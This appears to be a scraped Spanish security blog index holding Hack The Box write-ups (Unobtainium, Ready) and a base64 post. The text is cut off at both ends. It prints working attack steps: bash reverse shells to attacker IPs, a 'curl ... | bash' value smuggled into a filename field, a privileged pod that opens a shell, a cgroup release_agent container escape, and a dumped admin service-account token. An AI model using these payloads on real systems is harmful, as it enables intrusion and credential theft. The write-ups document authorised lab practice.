(235d ago) 659d devnode-deployment-776dbcf7d6-sr6vj 1/1 Running 6 (235d ago) 659d Una vez tenemos los pods, hacemos un describe, para ver más info del primer pod\n./kubectl describe pods/devnode-deployment-776dbcf7d6-g4659 -n dev Name: devnode-deployment-776dbcf7d6-g4659 Namespace: dev Priority: 0 Service Account: default Node: unobtainium/10.10.10.235 Start Time: Mon, 29 Aug 2022 09:32:21 +0000 Labels: app=devnode pod-template-hash=776dbcf7d6 Annotations: \u0026lt;none\u0026gt; Status: Running IP: 10.42.0.62 IPs: IP: 10.42.0.62 Controlled By: ReplicaSet/devnode-deployment-776dbcf7d6 Containers: devnode: Container ID: docker://733280337cc5998774d1a54dd9c8d0bc59f09053952f497050267389b18c08a9 Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:e965afd6a7e1ef3093afdfa61a50d8337f73cd65800bdeb4501ddfbc598016f5 Port: 3000/TCP Host Port: 0/TCP State: Running Started: Tue, 18 Jun 2024 11:08:53 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Fri, 27 Oct 2023 15:17:48 +0000 Finished: Fri, 27 Oct 2023 15:24:53 +0000 Ready: True Restart Count: 6 Environment: \u0026lt;none\u0026gt; Mounts: /root/ from user-flag (rw) /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-ww6h2 (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: user-flag: Type: HostPath (bare host directory volume) Path: /opt/user/ HostPathType: kube-api-access-ww6h2: Type: Projected (a volume that contains injected data from multiple sources) TokenExpirationSeconds: 3607 ConfigMapName: kube-root-ca.crt ConfigMapOptional: \u0026lt;nil\u0026gt; DownwardAPI: true QoS Class: BestEffort Node-Selectors: \u0026lt;none\u0026gt; Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: \u0026lt;none\u0026gt; Este pod tiene la ip 10.42.0.62 y el puerto 3000 abierto y nosotros estamos en la 10.42.0.70.\nSi hacemos un curl al puerto 3000 del pod, parece que esté funcionando el mismo servicio que hemos vulnerado en el contenedor 10.42.0.70\nroot@webapp-deployment-9546bc7cb-zjnnh:~# curl 10.42.0.62:3000 [] root@webapp-deployment-9546bc7cb-zjnnh:~# curl 10.42.0.70:3000 [{\u0026#34;icon\u0026#34;:\u0026#34;__\u0026#34;,\u0026#34;test\u0026#34;:\u0026#34;something\u0026#34;,\u0026#34;id\u0026#34;:1,\u0026#34;timestamp\u0026#34;:1718714423614,\u0026#34;userName\u0026#34;:\u0026#34;felamos\u0026#34;}]root@webapp-deployment-9546bc7cb-zjnnh:~# Lo que podemos intentar es vulnerar el contenedor que está dentro del namespace dev y ver si tenemos algún tipo de privilegio especial dentro del contenedor\nPara ello vamos a hacer un poco de pivoting\u0026hellip;\nPrimero nos pasamos a la máquina víctima chisel y socat\nDesde nuestra máquina abrimos un servidor con chisel por el puerto 1234\n./chisel server --reverse -p 1234 Desde la máquina víctima nos conectamos a ese servidor\n./chisel client 10.10.14.47:1234 R:socks \u0026amp; Después en el archivo de configuración de proxychains abajo del todo añadimos\nsocks5 127.0.0.1 1080 Ahora ya deberíamos poder hacer un curl al puerto 3000 del pod del namespace dev desde nuestra máquina\nsudo proxychains curl 10.42.0.62:3000 2\u0026gt;/dev/null [] Explotamos el prototype pollution\nsudo proxychains curl -X PUT -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;message\u0026#34;: {\u0026#34;test\u0026#34;: \u0026#34;something\u0026#34;,\u0026#34;__proto__\u0026#34;: {\u0026#34;canUpload\u0026#34;: true}}}\u0026#39; http://10.42.0.62:3000 2\u0026gt;/dev/null Para mandar la reverse shell, nos la podríamos mandar directamente, pero no me apetece, así que vamos a usar socat, para mandar la reverse shell al primer contendor y que el primer contenedor la redirija a nosotros con socat.\n$ cat shell2 bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.42.0.70/4433 0\u0026gt;\u0026amp;1\u0026#34; $ sudo python3 -m http.server 80 Ejecutamos el socat en el primer contenedor, para que redirija la reverse shell a nuestra máquina.\n./socat TCP-LISTEN:4433,fork TCP:10.10.14.47:4433 Ejecutamos un segundo socat para que cuando hagamos un curl para ver el código de la reverse shell a la ip 10.42.0.70 se redirija a nuestra ip\n./socat TCP-LISTEN:80,fork TCP:10.10.14.47:80 Nos ponemos en escucha por el puerto 4433\nnc -nlvp 443 Por último ejecutamos el payload y recibimos la shell.\nsudo proxychains curl -X POST http://10.42.0.64:3000/upload -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; },\u0026#34;filename\u0026#34;: \u0026#34;\u0026amp; curl 10.42.0.70/shell2 | bash\u0026#34;}\u0026#39; nc -nlvp 4433 listening on [any] 4433 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.235] 24106 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# Dentro de este contenedor nos pasamos el kubectl para enumerar el kubernetes. Para pasarlo voy a aprovechar el socat que usamos antes, voy a hacer una petición a la 10.42.0.70/kubectl la cual el contenedor 10.42.0.70 la redirigirá a mi máquina.\nwget 10.42.0.70/kubectl Con kubectl podemos probar si en este contenedor tenemos permisos para enumerar secretos\nroot@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n default no root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-system no root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-public no root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-node-lease no root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n dev no No tenemos ningún permiso distinto del otro pod. Dentro del namespace dev había más contenedores, así que vamos a probar de repetir el mismo proceso pero ahora para saltar al 10.42.0.62\nnc -nlvp 4433 listening on [any] 4433 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.235] 48507 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# script /dev/null -c bash \u0026lt;bcf7d6-g4659:/usr/src/app# script /dev/null -c bash Script started, file is /dev/null root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# Nos pasamos el kubectl\nwget 10.42.0.70/kubectl Volvemos a probar si tenemos permisos para enumerar secretos:\nroot@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl auth can-i get secrets -n default no root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl auth can-i get secrets -n kube-system yes Podemos enumerar los secretos del namespace kube-system\nroot@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl get secrets -n kube-system NAME TYPE DATA AGE unobtainium.node-password.k3s Opaque 1 659d horizontal-pod-autoscaler-token-2fg27 kubernetes.io/service-account-token 3 659d coredns-token-jx62b kubernetes.io/service-account-token 3 659d local-path-provisioner-service-account-token-2tk2q kubernetes.io/service-account-token 3 659d statefulset-controller-token-b25sg kubernetes.io/service-account-token 3 659d certificate-controller-token-98jdq kubernetes.io/service-account-token 3 659d root-ca-cert-publisher-token-t564t kubernetes.io/service-account-token 3 659d ephemeral-volume-controller-token-brb5h kubernetes.io/service-account-token 3 659d ttl-after-finished-controller-token-wf8k9 kubernetes.io/service-account-token 3 659d replication-controller-token-9m8mh kubernetes.io/service-account-token 3 659d service-account-controller-token-6vsl2 kubernetes.io/service-account-token 3 659d node-controller-token-dfztj kubernetes.io/service-account-token 3 659d metrics-server-token-d4k84 kubernetes.io/service-account-token 3 659d pvc-protection-controller-token-btkqg kubernetes.io/service-account-token 3 659d pv-protection-controller-token-k8gq8 kubernetes.io/service-account-token 3 659d endpoint-controller-token-zd5b9 kubernetes.io/service-account-token 3 659d disruption-controller-token-cnqj8 kubernetes.io/service-account-token 3 659d cronjob-controller-token-csxvj kubernetes.io/service-account-token 3 659d endpointslice-controller-token-wrnvm kubernetes.io/service-account-token 3 659d pod-garbage-collector-token-56dzk kubernetes.io/service-account-token 3 659d namespace-controller-token-g8jmq kubernetes.io/service-account-token 3 659d daemon-set-controller-token-b68xx kubernetes.io/service-account-token 3 659d replicaset-controller-token-7fkxv kubernetes.io/service-account-token 3 659d job-controller-token-xctqc kubernetes.io/service-account-token 3 659d ttl-controller-token-rsshv kubernetes.io/service-account-token 3 659d deployment-controller-token-npk6k kubernetes.io/service-account-token 3 659d attachdetach-controller-token-xvj9h kubernetes.io/service-account-token 3 659d endpointslicemirroring-controller-token-b5r69 kubernetes.io/service-account-token 3 659d resourcequota-controller-token-8pp4p kubernetes.io/service-account-token 3 659d generic-garbage-collector-token-5nkzj kubernetes.io/service-account-token 3 659d persistent-volume-binder-token-865v2 kubernetes.io/service-account-token 3 659d expand-controller-token-f2csp kubernetes.io/service-account-token 3 659d clusterrole-aggregation-controller-token-wp8k6 kubernetes.io/service-account-token 3 659d default-token-h5tf2 kubernetes.io/service-account-token 3 659d c-admin-token-b47f7 kubernetes.io/service-account-token 3 659d k3s-serving kubernetes.io/tls 2 235d Entre todos los secretos, llama la atención el c-admin-token-b47f7. Para ver su contenido usamos el siguiente comando\nroot@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl describe secrets/c-admin-token-b47f7 -n kube-system Name: c-admin-token-b47f7stem659:/usr/src/app# ./kubectl2 describe secret Namespace: kube-system Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name: c-admin kubernetes.io/service-account.uid: 31778d17-908d-4ec3-9058-1e523180b14c Type: kubernetes.io/service-account-token Data ==== namespace: 11 bytes token: eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA ca.crt: 570 bytes Ya tenemos el token, este token lo guardaremos dentro del archivo token. Ahora probamos si tenemos permisos elevados con este token. Empezamos comprobando si podemos crear pods con este token\n./kubectl auth --token $(cat token) can-i create pod yes Efectivamente podemos.\nEn esta página encontramos como escapar del contendor con este privilegio: https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes\nVamos a crear un pod, para ello primero creamos el siguiente yaml\nroot@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# cat mount_root.yaml apiVersion: v1 kind: Pod metadata: name: pwned2 labels: app: pentest spec: hostNetwork: true hostPID: true hostIPC: true containers: - name: pwned image: localhost:5000/node_server securityContext: privileged: true volumeMounts: - mountPath: /root/ name: getflag command: [ \u0026#34;/bin/bash\u0026#34; ] args: [ \u0026#34;-c\u0026#34;, \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.47/4434 0\u0026gt;\u0026amp;1;\u0026#34; ] #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name volumes: - name: getflag hostPath: path: /root/ Esto lo que va a hacer es que cuando creemos el pod con este yaml se ejecute desde la máquina host el comando que especificamos en command:\nComo image ponemos localhost:5000/node_server, ya que al ser hackthebox la máquina no tiene acceso a internet y no podemos poner un ubuntu. localhost:5000 es la imagen que se usa para los demás pods, esto lo vimos cuando hicimos un describe del pod\nImage: localhost:5000/node_server Nos ponemos en escucha\nnc -nlvp 4434 Creamos el pod\n./kubectl --token $(cat token) create -f mount_root.yaml Recibimos la shell!\nnc -nlvp 4434 listening on [any] 4434 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.235] 45130 bash: cannot set terminal process group (171718): Inappropriate ioctl for device bash: no job control in this shell root@unobtainium:/usr/src/app# Ya estamos en la máquina host como root\nMáquina completada\n","date":"2024-06-18","id":26,"permalink":"/writeups/hackthebox/unobtainium/","summary":"Comenzamos explotando una vulnerabilidad de prototype pollution. Luego, aprovechamos un CVE de inyección de comandos para ganar una shell en un contenedor. Para la escalada de privilegios, pivotamos entre contenedores de Kubernetes y analizamos los secretos de un namespace. Finalmente, utilizando el permiso para crear pods, logramos salir del contenedor.","tags":["Prototype pollution","OS command injection","Pivoting","Kubernetes"],"title":"Unobtainium"},{"content":"","date":"2024-06-13","id":27,"permalink":"/tags/base64/","summary":"","tags":[],"title":"base64"},{"content":"","date":"2024-06-13","id":28,"permalink":"/tags/crypto/","summary":"","tags":[],"title":"crypto"},{"content":"Base64 es muy conocido y se usa mucho, pero te has preguntado alguna vez como se desencripta/encripta manualmente?\nPrimero ponemos una cadena de ejemplo, por ejemplo \u0026ldquo;Hola\u0026rdquo;.\nDespués tenemos que convertir cada carácter de la string Hola a Ascii, esto lo podemos hacer consultando una tabla ascii\nUna vez tenemos los valores en ascii, los podemos convertir a binario, es importante que los bytes sean de 8 bits\nDespués agrupamos los bits en grupos de 6, en este caso el último byte se queda solo con 2 bits así que añadimos 4 ceros a la derecha para rellenar el byte\nPasamos el binario a decimal\nPor último, mediante la tabla de base64 convertimos los decimales a caracteres. Cabe recalcar que la string final codificada su número de caracteres tiene que ser múltiple de 4, en el caso de que no lo sea tenemos que añadir \u0026ldquo;=\u0026rdquo; hasta que lo sea\nPara desencriptar el mensaje de forma manual, simplemente habría que seguir el mismo proceso a la inversa\n","date":"2024-06-13","id":29,"permalink":"/blog/decodificar-y-codificar-en-base64-con-papel-y-boli/","summary":"Base64 es muy conocido y se usa mucho, pero te has preguntado alguna vez como se desencripta/encripta manualmente?","tags":["base64","crypto"],"title":"Decodificar y codificar en base64 con papel y boli"},{"content":"","date":"2024-06-07","id":30,"permalink":"/tags/docker/","summary":"","tags":[],"title":"docker"},{"content":"","date":"2024-06-07","id":31,"permalink":"/tags/gitlab/","summary":"","tags":[],"title":"gitlab"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.220 PING 10.10.10.220 (10.10.11.254) 56(84) bytes of data. 64 bytes from 10.10.11.254: icmp_seq=1 ttl=63 time=38.4 ms --- 10.10.10.220 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 38.381/38.381/38.381/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.220 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.220 5 │ [*] Open ports: 22,5080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p22,5080 -sCV 10.10.10.220 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18💿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit |_http-trane-info: Problem with XML parsing of /evox/about Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 5080 Dentro del puerto 5080 hay un gitlab corriendo. Cuando entramos, nos deja crear una cuenta, así que creamos una cuenta y entramos con ella.\nUna vez estamos autentificados si vamos al /help aparece la versión del gitlab: 11.4.7\nCon searchsploit identificamos que es una versión vulnerable a un RCE\nsearchsploit gitlab 11.4.7 ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Aut | ruby/webapps/49257.py GitLab CE/EE \u0026lt; 16.7.2 - Password Reset | java/remote/51889.txt ------------------------------------------- --------------------------------- Ninguno de estos exploits me funciono así que vamos a usar otro que encontré por github\ngit clone https://github.com/dotPY-hax/gitlab_RCE cd gitlab_RCE python3 gitlab_rce.py http://10.10.10.220:5080 10.10.14.32 Gitlab Exploit by dotPY [insert fancy ascii art] registering LonNmLDZ17:5FPfA5fANt - 200 Getting version of http://10.10.10.220:5080 - 200 The Version seems to be 11.4.7! Choose wisely delete user LonNmLDZ17 - 200 [0] - GitlabRCE1147 - RCE for Version \u0026lt;=11.4.7 [1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more [2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP type a number and hit enter to choose exploit: 0 Start a listener on port 42069 and hit enter (nc -vlnp 42069) registering SrqNdC0XFY:XDdWDl100T - 200 hacking in progress - 200 delete user SrqNdC0XFY - 200 Durante la ejecución nos pide que nos pongamos en escucha por un puerto con nc (nc -nlvp 42069)\nUna vez terminado el script, recibimos la reverse shell.\nEscalada de privilegios Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último, si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Después de una búsqueda por el sistema, encontramos una carpeta dentro del /opt llamada backups, la cual llama la atención\ngit@gitlab:/opt$ ls backup gitlab Dentro de backup, hacemos un cat a todos los archivos y filtramos por información relevante como por ejemplo password\ngit@gitlab:/opt/backup$ cat * | grep password gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;) #### Email account password # gitlab_rails[\u0026#39;incoming_email_password\u0026#39;] = \u0026#34;[REDACTED]\u0026#34; # password: \u0026#39;_the_password_of_the_bind_user\u0026#39; # password: \u0026#39;_the_password_of_the_bind_user\u0026#39; # \u0026#39;/users/password\u0026#39;, #### Change the initial default admin password and shared runner registration tokens. # gitlab_rails[\u0026#39;initial_root_password\u0026#39;] = \u0026#34;password\u0026#34; # gitlab_rails[\u0026#39;db_password\u0026#39;] = nil # gitlab_rails[\u0026#39;redis_password\u0026#39;] = nil gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59......\u0026#34; # gitlab_shell[\u0026#39;http_settings\u0026#39;] = { user: \u0026#39;username\u0026#39;, password: \u0026#39;password\u0026#39;, ca_file: \u0026#39;/etc/ssl/cert.pem\u0026#39;, ca_path: \u0026#39;/etc/pki/tls/certs\u0026#39;, self_signed_cert: false} ##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab` # postgresql[\u0026#39;sql_user_password\u0026#39;] = \u0026#39;SQL_USER_PASSWORD_HASH\u0026#39; # postgresql[\u0026#39;sql_replication_password\u0026#39;] = \u0026#34;md5 hash of postgresql password\u0026#34; # You can generate with `gitlab-ctl pg-password-md5 \u0026lt;dbuser\u0026gt;` # redis[\u0026#39;password\u0026#39;] = \u0026#39;redis-password-goes-here\u0026#39; ####! **Master password should have the same value defined in ####! redis[\u0026#39;password\u0026#39;] to enable the instance to transition to/from # redis[\u0026#39;master_password\u0026#39;] = \u0026#39;redis-password-goes-here\u0026#39; # geo_secondary[\u0026#39;db_password\u0026#39;] = nil # geo_postgresql[\u0026#39;pgbouncer_user_password\u0026#39;] = nil # password: PASSWORD ###! generate this with `echo -n \u0026#39;$password + $username\u0026#39; | md5sum` # pgbouncer[\u0026#39;auth_query\u0026#39;] = \u0026#39;SELECT username, password FROM public.pg_shadow_lookup($1)\u0026#39; # password: MD5_PASSWORD_HASH # postgresql[\u0026#39;pgbouncer_user_password\u0026#39;] = nil Entre toda la información reportada, vemos una contraseña: wW59\u0026hellip;\u0026hellip;\nLa cual nos sirve para el usuario root\ngit@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# Con un ls -l al la raiz, identificamos que estamos dentro de un contenedor docker, ya que hay un .dockerenv\nroot@gitlab:/opt/backup# ls -la / total 100 drwxr-xr-x 1 root root 4096 Apr 5 2022 . drwxr-xr-x 1 root root 4096 Apr 5 2022 .. -rwxr-xr-x 1 root root 0 Apr 5 2022 .dockerenv Empezamos enumerando las capabilites del contenedor, con\nroot@gitlab:/opt/backup# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37 Entre todas las capabilities reportadas encontramos la cap_sys_admin\nEl hecho de que exista esta capability nos permite salir del docker, de la siguiente forma\nNos ponemos en escucha por el puerto 444\nnc -nlvp 444 Ejecutamos todo esto en la máquina víctima\nmkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` echo \u0026#34;$host_path/cmd\u0026#34; \u0026gt; /tmp/cgrp/release_agent echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; /cmd echo \u0026#34; bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.32/444 0\u0026gt;\u0026amp;1\u0026gt; $host_path/output\u0026#34; \u0026gt;\u0026gt; /cmd chmod a+x /cmd bash -c \u0026#34;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026#34; Nos llega la reverse shell!!!\n","date":"2024-06-07","id":32,"permalink":"/writeups/hackthebox/ready/","summary":"En esta máquina, explotamos una vulnerabilidad CVE en GitLab que nos permite ejecutar comandos. Para la escalada de privilegios, logramos escapar de un contenedor Docker que tiene la capability cap_sys_admin","tags":["gitlab","docker"],"title":"Ready"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.194 PING 10.10.10.194 (10.10.11.254) 56(84) bytes of data. 64 bytes from 10.10.11.254: icmp_seq=1 ttl=63 time=38.4 ms --- 10.10.10.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 38.381/38.381/38.381/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.194 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.194 5 │ [*] Open ports: 22,80,8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p22,80,8080 -sCV 10.10.10.194 -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 18:42 CEST Nmap scan report for skyfall.htb (10.10.11.254) Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 y 8080 En el puerto 80 hay una web corriendo con apache 2.4.41.\nEmpezamos haciendo fuzzing con gobuster para encontrar subdirectorios.\n\u0026gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.194 -x php /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 14175] /news.php (Status: 200) [Size: 0] /files (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.194/files/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.194/assets/] Si accedemos en news.php, vemos una página en blanco, pero si accedemos desde el botón de la página principal, nos lleva a 